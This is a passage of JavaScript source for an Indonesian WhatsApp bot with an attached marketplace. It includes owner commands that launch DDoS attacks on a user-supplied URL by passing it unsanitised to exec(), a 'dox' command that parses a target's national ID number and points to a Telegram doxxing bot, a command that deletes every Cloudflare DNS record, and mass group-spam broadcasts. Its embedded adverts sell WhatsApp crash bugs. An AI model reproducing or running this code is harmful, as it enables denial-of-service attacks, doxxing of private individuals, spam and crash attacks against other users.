 const zonenya = `${global.zone}`;
 const apinya = `${global.apidomain}`; // Ganti dengan API Key Anda
 
 const options = {
 method: 'GET',
 headers: {
 "Accept": "application/json",
 'Content-Type': 'application/json',
 Authorization: "Bearer " + apinya
 }
 };

 // Fungsi untuk mengambil DNS records dari Cloudflare
 const getDnsRecords = async () => {
 try {
 const response = await fetch(`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records`, options);
 const data = await response.json();
 if (data.success) {
 return data.result;
 } else {
 console.error('Error fetching DNS records:', data.errors);
 return [];
 }
 } catch (error) {
 console.error('Fetch error:', error);
 return [];
 }
 }

 // Fungsi untuk menghapus DNS records berdasarkan ID
 const deleteDnsRecord = async (id) => {
 try {
 const response = await fetch(`https://api.cloudflare.com/client/v4/zones/${zonenya}/dns_records/${id}`, {
 method: 'DELETE',
 headers: {
 "Accept": "application/json",
 'Content-Type': 'application/json',
 Authorization: "Bearer " + apinya
 }
 });
 const data = await response.json();
 return data.success;
 } catch (error) {
 console.error('Delete error:', error);
 return false;
 }
 }

 // Proses utama
 (async () => {
 const dnsRecords = await getDnsRecords();
 if (dnsRecords.length > 0) {
 
 for (const record of dnsRecords) {
 const id = record.id;
 const deleteSuccess = await deleteDnsRecord(id);
 if (deleteSuccess) {
 console.log(`Successfully deleted DNS record with ID: ${id}`);
 } else {
 console.log(`Failed to delete DNS record with ID: ${id}`);
 }
 }
 
 } else {
 console.log('Failed to fetch DNS records.');
 }
 rafatharcodereply(`Berhasil Menghapus Semua Subdomain`);
 })();
}

 break
case 'addgold': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} 628xx 1000`)
let trg = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
addGold(trg, parseInt(args[1]), db_gold)
m.reply(`*SUKSED ADD GOLD*
Nomor: ${args[0]}
Gold: ${toRupiah(args[1])}`)
}
break

case 'mingold': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} 628xx 1000`)
if (cekGold(q.split(",")[0]+"@s.whatsapp.net", db_gold) < q.split(",")[1] && cekGold(q.split(",")[0]+"@s.whatsapp.net", db_gold) !== 0) return m.reply(`Pengurangan sangat berlebihan!`)
let tar = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
minGold(tar, parseInt(args[1]), db_gold)
m.reply(`*SUKSES MIN GOLD*
Nomor: ${args[0]}
Gold: ${args[1]} `
)}
break

case 'addsaldo': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} 62xx 1000`)
let trgt = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
addSaldo(trgt, parseInt(args[1]), db_saldo)
m.reply(`*SUKSED ADD SALDO*
Nomor: ${args[0]}
Saldo: Rp. ${toRupiah(args[1])} `)
}
break

case 'minsaldo': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} 628xx 1000`)
if (cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) < q.split(",")[1] && cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo) !== 0) return m.reply(`Pengurangan sangat berlebihan!`)
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
minSaldo(target, parseInt(args[1]), db_saldo)
m.reply(`*SUKSES MIN SALDO*
Nomor: ${args[0]}
Saldo: Rp. ${toRupiah(args[1])} `
)}
break

case 'addlimit': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} 628xx 1000`)
let tr = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
addLimit(tr, parseInt(args[1]), db_limit)
m.reply(`*SUKSED ADD LIMIT*
Nomor: ${args[0]}
Limit: ${args[1]} `)
}
break

case 'minlimit': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} 628xx 1000`)
if (cekLimit(q.split(",")[0]+"@s.whatsapp.net", db_limit) < q.split(",")[1] && cekLimit(q.split(",")[0]+"@s.whatsapp.net", db_limit) !== 0) return m.reply(`Pengurangan sangat berlebihan!`)
let targe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
minLimit(targe, parseInt(args[1]), db_limit)
m.reply(`*SUKSES MIN LIMIT*
Nomor: ${args[0]}
Limit: ${args[1]} `
)}
break

case 'sampah':
case 'delsampah':
case 'delsampah2': {
if (!isOwner) return onlyOwn();
const getFiles = (dir) => {
return fs.readdirSync(dir).filter(v =>
v.endsWith("gif") || v.endsWith("png") || v.endsWith("mp3") ||
v.endsWith("mp4") || v.endsWith("jpg") || v.endsWith("jpeg") ||
v.endsWith("webp") || v.endsWith("webm")
).map(v => `${dir}/${v}`)};
let libFiles = getFiles('./lib');
let rootFiles = getFiles('.').filter(v => !v.startsWith('./lib/'));
let all = [...libFiles, ...rootFiles];
let jumlahSampah = all.length;
var teks = `${monospace("Jumlah Sampah")}\n\n`;
teks += `Total: ${jumlahSampah} sampah\n\n`;
teks += all.map(o => `${o}\n`).join("");
if (jumlahSampah > 0) {
edit3(teks, `Menghapus ${jumlahSampah} file sampah.`, `Sukses menghapus semua sampah.`);
all.forEach(file => {
fs.unlinkSync(file);
});
} else {
edit2(teks, `Tidak ada file sampah untuk dihapus.`);
}}
break;

case 'clearsesi':
case 'clearallsesi': {
if (!isOwner) return onlyOwn()
let directoryPath = path.join(`./${sessionName}`) //&& './lib') //path.join();
fs.readdir(directoryPath, async function (err, files) {
if (err) {
return m.reply('Tidak dapat memindai direktori: ' + err);
} 
let filteredArray = await files.filter(item => item.startsWith("session") || item.startsWith("pre-key") || item.startsWith("sender-key")  )
var teks = `Menghapus ${filteredArray.length} file sampah...\n\n`
if (filteredArray.length == 0) return m.reply(teks)
/*filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})*/
edit2(teks, 'Berhasil menghapus semua sampah')
await filteredArray.forEach(function (file) {
fs.unlinkSync(`./${sessionName}/${file}`)
});
});
}
break

case 'ddos-hent': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} linknya`)
m.reply(`Serangan DDoS telah dieksekusi ke situs web yang dituju:\n\nTarget: ${text}\nTime: 60\nThread: 20\nRate: 100`);
exec(`node ./lib/ddos/hent.js ${text} 60 20 100 proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break

case 'ddos-mix': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} linknya`)
m.reply(`Serangan DDoS telah dieksekusi ke situs web yang dituju:\n\nTarget: ${text}\nTime: 60\nThread: 20\nRate: 100`);
exec(`node ./lib/ddos/mix.js ${text} 60 20 100 proxy.txt`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
}
break

case 'getdb': {
if (!isOwner) return onlyOwn()
rafatharcode.sendMessage(from, {document: fs.readFileSync('./data/rafatharcode-db/database.json'), caption: 'Database Bot', mimetype: 'application/json', fileName: 'database.json' }, {quoted: m})
}
break

case 'getfolder': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`*CONTOH PENGGUNAAN*\n\n${prefix+command} ./foldername\n\nInfo lebih: $ ls ./`);

const folderPath = text;
const zipPath = `${folderPath}.zip`;

try {
const output = fs.createWriteStream(zipPath);
const archive = archiver('zip', { zlib: { level: 9 } });

output.on('close', function () {
rafatharcode.sendMessage(m.chat, {
document: fs.readFileSync(zipPath),
caption: text,
mimetype: 'application/zip',
fileName: path.basename(zipPath)
}, { quoted: m });

fs.unlinkSync(zipPath);});
archive.pipe(output);
archive.directory(folderPath, false);
archive.finalize();
} catch (err) {
console.error('Terjadi kesalahan:', err);
m.reply('Terjadi kesalahan saat mengompresi atau mengirim folder.');
}}
break

case 'getfile': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`*CONTOH PENGGUNAAN*\n\n#1: ${prefix+command} ./rafatharcode.js\n#2: ${prefix+command} ./lib/general/scrape.js\n\nInfo lebih: $ ls ./lib`)
if (!text.endsWith('.js')) return m.reply('Untuk mengambil file selain js, gunakan .getfile2/.getfile3')
const fileName = path.basename(text)
try {
rafatharcode.sendMessage(from, {
document: fs.readFileSync(`${text}`),
caption: text,
mimetype: 'application/js',
fileName: fileName
}, { quoted: m })
} catch (err) {
m.reply('Tidak dapat menemukan file yang kamu cari')
}}
break

case 'getfile2': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`*CONTOH PENGGUNAAN*\n\n#1: ${prefix+command} ./package.json\n#2: ${prefix+command} ./data/users.json\n\nInfo lebih: $ ls ./data`)
if (!text.endsWith('.json')) return m.reply('Untuk mengambil file selain json, gunakan .getfile/.getfile3')
const fileName = path.basename(text)
try {
rafatharcode.sendMessage(from, {
document: fs.readFileSync(`${text}`),
caption: text,
mimetype: 'application/json',
fileName: fileName
}, { quoted: m })
} catch (err) {
m.reply('Tidak dapat menemukan file yang kamu cari')
}}
break

case 'getfile3': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`*CONTOH PENGGUNAAN*\n\n#1: ${prefix+command} ./gambar.jpg\n#2: ${prefix+command} ./data/gambar.jpg\n\nInfo lebih: $ ls`);
const mime = require('mime-types');
const fileName = path.basename(text);
const isImage = /\.(jpg|jpeg|png)$/i.test(fileName);
const mimeType = mime.lookup(fileName);
try {
if (isImage && mimeType) {
rafatharcode.sendMessage(from, {
image: fs.readFileSync(`${text}`),
caption: text,
}, { quoted: m });

rafatharcode.sendMessage(from, {
document: fs.readFileSync(`${text}`),
caption: text,
mimetype: mimeType,
fileName: fileName
}, { quoted: m });
} else {
m.reply('File yang diminta bukan gambar. Pastikan file berekstensi .jpg, .jpeg, atau .png');
}} catch (err) {
m.reply('Tidak dapat menemukan file yang kamu cari');
}}
break

case 'addfolder': {
if (!isOwner) return onlyOwn();
if (!text.startsWith("./")) {
return m.reply(`Format salah. Contoh penggunaan: ${prefix+command} ./foldername`);
}
let folderPath = path.resolve(text);
try {
if (fs.existsSync(folderPath)) {
return m.reply('Folder sudah ada di lokasi tersebut!');
}
fs.mkdirSync(folderPath, { recursive: true });
m.reply(`Berhasil membuat folder ${folderPath}`);
} catch (error) {
console.error('Error:', error);
m.reply('Terjadi kesalahan saat membuat folder. Silakan coba lagi.');
}}
break

case 'addfile': {
if (!isOwner) return onlyOwn();
if (!text.includes("./")) return m.reply(`Contoh: ${prefix+command} ./path/to/file.txt`); 
let filePath = path.resolve(text);
let dir = path.dirname(filePath);
let fileName = path.basename(filePath);
if (!fs.existsSync(dir)) {
return m.reply('Direktori tidak ditemukan!');
}
let media = await downloadContentFromMessage(m.quoted, "document");
let buffer = Buffer.from([]);
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk]);
}
if (fs.existsSync(filePath)) {
fs.appendFileSync(filePath, buffer);
m.reply(`Berhasil menambahkan konten ke ${fileName}`);
} else {
fs.writeFileSync(filePath, buffer);
m.reply(`Berhasil membuat file ${fileName} dan menambahkan konten.`);
}}
break

case 'delfolder': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`*CONTOH PENGGUNAAN*\n\n#1: ${prefix+command} ./lib\n#2: ${prefix+command} ./lib/general\n\nInfo lebih: $ ls`)
const folderPath = path.resolve(text)
const basePath = path.resolve('./')
if (!folderPath.startsWith(basePath)) {
return m.reply('Kamu tidak memiliki izin untuk menghapus folder ini')
}
fs.stat(folderPath, (err, stats) => {
if (err) {
return m.reply('Folder yang kamu cari tidak ditemukan')
}
if (!stats.isDirectory()) {
return m.reply('Path yang diberikan bukan sebuah folder')
}
fs.rmdir(folderPath, { recursive: true }, (err) => {
if (err) {
console.log(err)
return m.reply('Tidak dapat menghapus folder yang kamu cari')
}
m.reply(`Folder ${path.basename(folderPath)} berhasil dihapus`)
})
})
}
break

case 'delfile': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`*CONTOH PENGGUNAAN*\n\n#1: ${prefix+command} ./rafatharcode.js\n#2: ${prefix+command} ./data/users.json\n\nInfo lebih: $ ls`)
 
const filePath = path.resolve(text)
const basePath = path.resolve('./')
if (!filePath.startsWith(basePath)) {
return m.reply('Kamu tidak memiliki izin untuk menghapus file ini')
}
try {
if (fs.existsSync(filePath)) {
fs.unlinkSync(filePath)
m.reply(`File ${path.basename(filePath)} berhasil dihapus`)
} else {
m.reply('File yang kamu cari tidak ditemukan')
}
} catch (err) {
console.log(err)
m.reply('Tidak dapat menghapus file yang kamu cari')
}}
break

case 'done': {
if (!isOwner) return onlyOwn()
let t = text.split(',');
if (t.length < 2) return rafatharcodereply(`*Format salah!*
Penggunaan:
${prefix + command} barang,nominal,sistem, paymentt`);
let barang = t[0];
let nominal = t[1];
let sistem = t[2];
let paymentt = t[3];
var teks = `
_*Alhamdulillah Next Order Cik✅*_

 _• *Barang:* ${barang}_
 _• *Nominal:* Rp${nominal}_
 _• *Payment:* ${paymentt}_
 _• *Sistem:* ${sistem}_
 _• *Nama store:* ${namabot}_

*List Market RafatharCode*

> _• Panel 1Gb-Unli_
> _• MURLOG,MURBUG,MURNOKOS,MURPUSH 5K_
> _• RESELLER PANEL 1 BULAN 5K_
> _• RESELLER PANEL PERMANEN 7K_
> _• ADMIN PANEL PERMANEN 10K_
> _• PT PANEL PERMANEN 20K_
> _• DLL TANYA AJA_
======================
☎️Contact Admin☎️
> 📞Nope Admin : Wa.me//6285864743922

*Transaksi Done By ${ownername} ✅*`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Chat Owner\",\"url\":\"https://wa.me/6283161246809\",\"merchant_url\":\"https://wa.me/6283161246809\"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Testi Owner\",\"url\":\"https://whatsapp.com/channel/0029Vajny6c4tRs0qnwveJ0s\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vajny6c4tRs0qnwveJ0s\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await rafatharcode.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case 'jpmslide': case 'startjpmslide': {
if (!isOwner) return onlyOwn()
let total = 0
let getGroups = await rafatharcode.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let usergc = groups.map((v) => v.id)
let time = ms(delayjpm * Number(usergc.length))
let imgsc = await prepareWAMessageMedia({ image: await fs.readFileSync("./r/thumbnail.jpg") }, { upload: rafatharcode.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open ✅*\n\n*RiiSTORE ID* Menyediakan Produk & Jasa Dibawah Ini ⬇️"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*� PANEL UNLI 1GB-UNLI*
*� RESELLER PANEL (7K/PERMA)*
*� ADMIN PANEL (10K/PERMA)*
*� PT PANEL (15K/PERMA)*
*� OWN PANEL (20K/PERMA)*
*� OPEN MURBUG (5K/PERMA)*
*� OPEN MURNOKOS (8K)*
*� OPEN MURLOG (5K)*
*� OPEN BOTPUSH (5K/PERMA)*
*� OPEN BOT JAGA GC ANTILINK (5K/PERMA)*
*� OPEN MURSUN (5K)*
*� NOKOS INDO (7K)*
*� NOKOS VIETNAM (6K)*
*� SC BUG TEMBUS ALLWA (10K)*
*� DLL TANYAKAN OWNER/ADMIN*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/6283161246809\",\"merchant_url\":\"https://wa.me/6283161246809\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*OPEN NOKOS*
_-NOKOS INDO  (7K)_
_-NOKOS VIET  (6K)_
_-NOKOS CANADA  (6K)_
_-NOKOS MALAYSIA  (10K)_
_-DLL TANYAKN ADMIN_

*OPEN MURNOKOS 8K*
KEUNTUNGAN?
> BISA DIJUAL KENBALI MURNOKOS
> NOKOS MURMER
> JDI KANG NOKOS
> NOKOS ANTI RAWAN KENON`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/6283161246809\",\"merchant_url\":\"https://wa.me/6283161246809\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `*OPEN MURBUG BY 𝙍𝙖𝙛𝙖𝙩𝙝𝙖𝙧𝘾𝙤𝙙𝙚444*
PRICE LIST:
5K/BULAN
10K/PERMA (SMPE PANEL MOKAD)

FUNGSI?
_-BUAT CRASH/BUG NO RIPER_

KEUNTUNGAN?*
_-HARGA LEBIH MURAH DRI STORE YG LAIN_
_-TEMBUS ALL WA_
_-MENDAPATKAN GARANSI JIKA BUG TIDAK TEMBUS_`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/6283161246809\",\"merchant_url\":\"https://wa.me/6283161246809\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: m})
await rafatharcodereply(`Memproses Mengirim Pesan Slide Teks & Foto Ke *${usergc.length} Grup*

*Waktu Selsai :*
${time.minutes} menit, ${time.seconds} detik`)
for (let jid of usergc) {
try {
await rafatharcode.relayMessage(jid, msgii.message, {messageId: msgii.key.id})
total += 1
} catch {}
await sleep(global.delayjpm)
}
await rafatharcodereply(`Berhasil Mengirim Pesan Slide Teks & Foto Ke *${total} Grup*`)
}
break

case 'gcast': case 'broadcast': {
if (!isOwner) return onlyOwn()
if (!text) return rafatharcodereply(`Text mana?\n\nExample : ${prefix + command} RafatharCode`)
let getGroups = await rafatharcode.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
rafatharcodereply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
for (let i of anu) {
await sleep(1500)
rafatharcode.sendMessage(i, {text: `${text}`}, {quoted:m})
}
rafatharcodereply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
}
break  

case 'nikparser': case 'dox':
if (!isOwner) return onlyOwn()
if (!q) return rafatharcodereply(`</> Anda harus mendapatkan nik target terlebih dahulu dan lakukan command seperti ini : ${prefix + command} 16070xxxxx\n\n`)
const { nikParser } = require('nik-parser')
const ktp = q
const nik = nikParser(ktp)
m.reply(`Nik: ${nik.isValid()}\nProvinsi ID: ${nik.provinceId()}\nNama Provinsi: ${nik.province()}\nKabupaten ID: ${nik.kabupatenKotaId()}\nNama Kabupaten: ${nik.kabupatenKota()}\nKecamatan ID: ${nik.kecamatanId()}\nNama Kecamatan: ${nik.kecamatan()}\nKode Pos: ${nik.kodepos()}\nJenis Kelamin: ${nik.kelamin()}\nTanggal Lahir: ${nik.lahir()}\nUniqcode: ${nik.uniqcode()}`)
break
case 'getnik':
if (!isOwner) return onlyOwn()
tutor = fs.readFileSync('./tutor.jpg')
rafatharcode.sendMessage(m.chat, {image: tutor, caption: `Bot Telegram untuk mendapatkan nik target: @DoxxingRafatharCodeBot / https://t.me/DoxxingRafatharCodeBot`},{quoted: m})
break

case 'totalmem': {
if (!isOwner) return onlyOwn()
if (!m.isGroup) return onlyGrup()
let total = await rafatharcode.groupMetadata(m.chat).then((data) => {
    return data.participants.length
  })
  let subject = (await rafatharcode.groupMetadata(m.chat)).subject
  let allmem = await rafatharcode.groupMetadata(m.chat).then((data) => {
    return data.participants.map((v) => v.id)
  })
  let teks = `Total Member *${subject}* (${total})\n\n`
  rafatharcode.sendTextWithMentions(m.chat, teks + allmem.map((v, i) => `${i + 1}. @${v.split("@")[0]}`).join("\n"), m)
}
break

case 'hidetag':
if (!m.isGroup) return onlyGrup()
if (!isOwner && !isAdmins) return onlyOwn()
if (!q) return rafatharcodereply(`Teks Nya Mana Kak?`)
rafatharcode.sendMessage(m.chat, {
    text: q,
    contextInfo: {
        mentionedJid: participants.map(a => a.id),
        groupMentions: [{
            groupJid: m.chat,
            groupSubject: 'anjay'
        }]
    }
})
break

case 'infogempa':
        axios.get(`https://itzpire.com/information/gempaWarning`)
        .then(({ data }) => {
            if (data.status !== 'success') {
                return rafatharcodereply("Maaf, terjadi kesalahan pada server. Coba lagi nanti.");
            }
            const gempaInfo = data.data;
            const responseText = `*╭────〔 INFO GEMPA 〕─*
    *┊ Tanggal* : ${gempaInfo.tanggal}
    *┊ Magnitudo* : ${gempaInfo.magnitudo}
    *┊ Kedalaman* : ${gempaInfo.kedalaman}
    *┊ Kordinat* : ${gempaInfo.koordinat}
    *┊ Lokasi* : ${gempaInfo.lokasi}
    *┊ Wilayah Terdampak* : ${gempaInfo.wilayahDirasakan}
    *╰┈┈┈┈┈┈┈┈*
            `;
            rafatharcode.sendMessage(m.key.remoteJid, { image: { url: gempaInfo.linkPeta }, caption: responseText });
        })
        .catch((error) => {
            console.error(error);
            rafatharcodereply("Maaf, terjadi kesalahan saat memeriksa informasi gempa. Coba lagi nanti.");
        });
    break

case 'subfinder' :{
if (!isOwner) return onlyOwn()
if (!q) rafatharcodereply(`*Format salah*\n*Contoh*: .subfinder google.com`) 
let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${q}`);
let list_domen = response.data.data.map((data, index) => {
return `${data}`;
}).join('\n');
let send_domain = `*List Domain*

${list_domen}
`
rafatharcodereply(send_domain) 
}
break

case 'ssweb': {
  if (!isOwner) return onlyOwn()
  if (!text) return rafatharcodereply('Mana linknya kak?');
  rafatharcodereply('_Waittt Sedang Kami Proses.._')
  const apiUrl = `https://api.betabotz.eu.org/api/tools/ssweb?url=${encodeURIComponent(text)}&device=tablet&apikey=aSkM8N5K`;
  const imagePath = path.join(__dirname, 'screenshot.png'); 

  try {
    
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    
    fs.writeFileSync(imagePath, response.data);
    
    
    await rafatharcode.sendMessage(m.chat, { image: { url: imagePath } }, { quoted: m });

    
    fs.unlinkSync(imagePath);
    console.log('Image sent and file deleted successfully.');

  } catch (error) {
    
    console.error('Error:', error.response ? error.response.data : error.message);
    rafatharcodereply('Yah, terjadi error kak. Silakan laporkan ke owner agar diperbaiki.');
  }
}
break

case 'idch': case 'idchannel': {
if (!isOwner) return onlyOwn()
if (!m.quoted) return rafatharcodereply('reply saluran channel nya')
try {
let id = (await m.getQuotedObj()).msg.contextInfo.forwardedNewsletterMessageInfo 
let send_ch = `*BERIKUT DATA CHANNEL ANDA*\n
*Name Channel*: ${id.newsletterName}\n*ID Channel*: ${id.newsletterJid}
`
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: send_ch
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"ID CHANNEL\",\"id\":\"123456789\",\"copy_code\":\"${id.newsletterJid}\"}`
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await rafatharcode.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
});
} catch (e) {
rafatharcodereply('Harus chat dari channel bang') 
}
}
break

case 'sewa': {
let teks = `¥ *Price Sewa Bot RafatharCode* €

🔏 3 hari = 15K
🔏 1 minggu = 25K
🔏 2 minggu = 50K
🔏 1 bulan = 65K

Untuk Melanjutkan Sewa Silahkan Ketik Contoh Di bawah
*Contoh => sewabot 1 minggu*`
rafatharcodereply(teks)
}
break

case 'sewabot':
if (!isOwner) return onlyOwn()
if (!isPc) return onlyPrivat()
if (!text) return rafatharcodereply(`*Contoh* :\n${prefix+command} 1 minggu `)
let cret = await rafatharcode.groupCreate(args.join(" "), [])
let ky = await rafatharcode.groupInviteCode(cret.id)
rafatharcode.sendMessage(m.chat, { text: `「 *Create Group Sewa* 」

Sewa Bot Selama *${text}* Sedang Dalam Prosess Silahkan Masuk Melalui Link Group Yang Sudah Di Sediakan..

_▸ Owner : ${global.namabot2}
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} 
_▸ Linkgc : https://chat.whatsapp.com/${ky}
`, m})
rafatharcodereply('pesan dan link group khusus sudah terkirim di chat privasi anda')
break

case 'accmem': {
if (!m.isGroup) return onlyGrup()
if (!isOwner && !isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
if (!args[0]) return rafatharcodereply("*Perintah tidak valid.*\nGunakan:\n- *acc list*\n- *acc approve [number]*\n- *acc reject [number]*\n- *acc reject [JID]*\n- *acc reject/approve all* untuk menolak/menyetujui semua permintaan bergabung.");

try {
let groupId = m.chat;
let [subCommand, options] = args;
let joinRequestList = await rafatharcode.groupRequestParticipantsList(groupId);

    const formatDate = (timestamp) => new Intl.DateTimeFormat('id-ID', {
        weekday: 'long',
        day: 'numeric',
        month: 'long',
        year: 'numeric'
    }).format(new Date(timestamp * 1000));

if (subCommand === "list") {
            const formattedList = joinRequestList.length > 0 ?
                joinRequestList.map((request, i) => `*${i + 1}.*\n• Nomor: ${request.jid.split('@')[0]}\n• Metode Permintaan: ${request.request_method}\n• Waktu Permintaan: ${formatDate(request.request_time)}\n\n`).join('') :
                "Tidak ada permintaan bergabung yang tertunda.";
            rafatharcodereply(`*Daftar Permintaan Bergabung:*\n\n${formattedList}`);
            }

if (subCommand  === "reject" || "approve") {
            if (options === "all") {
                for (const request of joinRequestList) {
                    await rafatharcode.groupRequestParticipantsUpdate(groupId, [request.jid], subCommand);
                    console.log(`Meng-${subCommand} participant dengan JID: ${request.jid}`);
                }
                rafatharcodereply(`*${subCommand === 'approve' ? 'Menyetujui' : 'Menolak'} semua permintaan bergabung.*`);
            } else {
                const actions = options.split(" ").map(action => action.trim());
                const participants = actions.map(action => joinRequestList[parseInt(action) - 1]).filter(request => request);
                if (participants.length > 0) {
                    let formattedResponse = '';
                    for (const request of participants) {
                        const response = await rafatharcode.groupRequestParticipantsUpdate(groupId, [request.jid], subCommand);
                        const status = response[0].status === 'success' ? 'Gagal' : 'Berhasil';
                        formattedResponse += `*${participants.indexOf(request) + 1}.*\n• Status: ${status}\n• Nomor: ${request.jid.split('@')[0]}\n\n`;
                        console.log(`Meng-${subCommand} participant dengan JID: ${request.jid}`);
                    }
                    rafatharcodereply(`*${subCommand === 'approve' ? 'Menyetujui' : 'Menolak'} Permintaan Bergabung:*\n\n${formattedResponse}`);
                } else {
                    rafatharcodereply("Tidak ada anggota yang cocok untuk reject/approve.");
                }
            }
            }
            } catch (err) {
            console.log(jsonformat(err))
            }
    }
    break

case 'creategc':
if (!isOwner) return onlyOwn()
if (!isPc) return onlyPrivat()
if (!text) return rafatharcodereply(`*Contoh* :\n${prefix+command} nama gc `)
let creat = await rafatharcode.groupCreate(args.join(" "), [])
let kiya = await rafatharcode.groupInviteCode(creat.id)
rafatharcode.sendMessage(m.chat, { text: `SUKSES MEMBUAT GC https://chat.whatsapp.com/${kiya}
`, m})
rafatharcodereply('pesan dan link group khusus sudah terkirim di chat privasi anda')
break

case 'bcgc': 
case 'bcgrup': {
if (!isOwner) return onlyOwn()
if (!isPc) return onlyPrivat()
rafatharcode.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
if (!text) m.reply(`Contoh: ${prefix+command} teks`)
let getGroups = await rafatharcode.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anu = groups.map(v => v.id)
for (let i of anu) {
await sleep(1500)
let metadat72 = await rafatharcode.groupMetadata(i)
let participanh = await metadat72.participants
let msg = generateWAMessageFromContent(i, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
